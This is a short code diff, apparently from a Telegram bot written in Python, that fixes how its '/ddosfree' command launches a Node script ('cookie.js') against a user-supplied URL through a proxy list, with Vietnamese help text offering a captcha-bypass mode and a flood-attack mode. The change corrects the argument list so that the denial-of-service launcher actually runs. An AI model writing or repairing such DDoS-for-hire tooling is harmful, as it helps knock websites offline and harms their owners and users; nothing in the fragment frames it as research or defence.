@@ -220,9 +220,9 @@ def ddos_command(message):
         return
     
     if method == "bypass":
-        command = ["node cookie.js", host, "120", "100", "100", "proxy.txt"]
+        command = ["node", "cookie.js", host, "120", "100", "100", "proxy.txt"]
     elif method == "flood":
-        command = ["node cookie.js", host, "120", "1000", "1000", "proxy.txt"]
+        command = ["node", "cookie.js", host, "120", "1000", "1000", "proxy.txt"]
     else:
         bot.reply_to(message, 'Method không hợp lệ.\nCú pháp đúng: /ddosfree <method> <url>\nPhương pháp hỗ trợ:\n- bypass: vượt capcha\n- flood : tấn công lũ')
         return
